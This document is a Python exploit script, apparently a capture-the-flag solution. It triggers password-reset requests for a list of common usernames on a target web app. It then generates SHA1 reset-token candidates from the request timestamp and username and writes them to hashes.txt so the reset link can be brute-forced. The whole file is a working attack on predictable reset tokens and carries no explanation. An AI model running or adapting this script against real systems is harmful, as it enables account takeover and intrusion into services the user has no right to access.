import requests
import hashlib
import datetime

usernames=['root','admin','test','guest','info','adm','mysql','user','administrator','oracle','ftp','pi','puppet','ansible','ec2-user','vagrant','azureuser','jane','clarice']
#Correct username is administrator
for x in usernames:
    data={'username':x}
    requests.post('http://10.10.127.0:8080/forgot_password',data=data) #Change ip address
    value=datetime.datetime.now(datetime.timezone.utc)
    user1=x
    for i in range(10):
        time = str(value)[:-14]+str(i)+"."
        for i in range(100):
            if(i<10):
                lnk = time+"0"+str(i)+" . " + user1.upper()
                lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
                with open('hashes.txt','a') as hashes:
                    hashes.write(lnk+'\n')
            else:
                lnk = time+str(i)+" . " + user1.upper() 
                lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
                with open('hashes.txt','a') as hashes:
                    hashes.write(lnk+'\n')
print('Check hashes.txt')
